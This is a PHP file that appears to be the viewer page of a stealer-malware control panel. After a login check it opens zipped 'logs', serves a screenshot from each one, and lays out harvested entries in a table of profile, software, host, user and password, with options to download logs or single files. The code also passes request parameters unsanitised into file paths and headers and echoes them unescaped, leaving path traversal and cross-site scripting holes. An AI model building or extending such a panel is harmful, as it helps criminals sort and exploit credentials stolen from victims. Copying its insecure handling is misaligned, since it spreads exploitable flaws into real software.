<?php

session_start();

if($_SESSION["login"] != true)
{
	header('Location: login.php', true, 301);
	exit();
}

require("Configs/Main.Config.php");

$log = $_GET["log"];
$file = $_GET["file"];
$action = $_GET["action"];

$db = mysqli_connect($config["main"]["mysql_server"], $config["main"]["mysql_user"], $config["main"]["mysql_password"], $config["main"]["mysql_dbname"]);

if($log != NULL)
{
	if($file != null)
	{
		if($file == "screenshot.jpg")
		{
			$z = new ZipArchive();
			
			if ($z->open(realpath($config["main"]["LogsFolder"].'/'. $log .'')) !== true) {
				echo "File not found.";
				return false;
			}

			$stat = $z->statName($file);
			$fp   = $z->getStream($file);
			if(!$fp) {
				echo "Could not load image.";
				return false;
			}
			
			if($action == "modal")
			{
				?>
				<img src="view.php?log=<? echo $log; ?>&file=screenshot.jpg" style="max-width: 100%;">
				<?
			}
			else
			{
				header('Content-Type: image/jpeg');
				header('Content-Length: ' . $stat['size']);
				fpassthru($fp);
			}
			
			exit(0);
		}
		else
		{
			$zip = new ZipArchive;
			$reading = "";
			
			if ($zip->open(realpath($config["main"]["LogsFolder"].'/'. $log .'')) === TRUE) 
			{
				$reading = $zip->getFromName($file);
				$zip->close();
				
				if($action == "modal")
				{
					// modal window
					?>
					<table class="table" style="word-break: break-word;">
						<thead>
							<tr>
								<th scope="col">Profile</th>
								<th scope="col">Soft</th>
								<th scope="col">Host</th>
								<th scope="col">User</th>
								<th scope="col">Password</th>
							</tr>
						</thead>
						<tbody>
					<?
					
					$working = explode("\n", $reading);
					$linec = 0;
					
					foreach($working as $line)
					{
						if($linec > 5)
						{
							$linec = 0;
						}
						
						$linec++;
						
						switch($linec)
						{
							case 1:
								$param = substr($line, 6);
								?><tr><td><? echo $param; ?></td><?
								break;
								
							case 2:
								$param = substr($line, 6);
								?><td><? echo $param; ?></td><?
								break;
								
							case 3:
								$param = substr($line, 6);
								?><td><? echo $param; ?></td><?
								break;
								
							case 4:
								$param = substr($line, 6);
								?><td><? echo $param; ?></td><?
								break;
								
							case 5:
								$param = substr($line, 6);
								?><td><? echo $param; ?></td></tr><?
								break;
						}
					}
					
					
					?>
						</tbody>
					</table>
					<?
				}
				else
				{
					if($action == "download")
					{
						header('Content-type: application/txt');
						header('Content-Disposition: attachment; filename="'. $file .'"');
						header('Content-Length: ' . strlen($reading));
							
						echo $reading;
						
						exit(0);
					}
					else
					{
						echo nl2br($reading);
						exit(0);
					}
				}
			} 
			else 
			{
				echo 'Error Reading File.';
			}
			
			exit(0);
		}
	}
	else if($action == "download")
	{
		$reading = "";
		
		$handle = fopen(realpath($config["main"]["LogsFolder"].'/'. $log .''), "r");
		
		if($handle)
		{
			$reading = fread($handle, filesize($config["main"]["LogsFolder"] ."/". $log));
			
			header('Content-type: application/txt');
			header('Content-Disposition: attachment; filename="'. $log .'"');
			header('Content-Length: ' . strlen($reading));
			
			echo $reading;
		}
		else 
		{
			echo 'Error Reading File.';
		}
		
		exit(0);
	}
}


function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>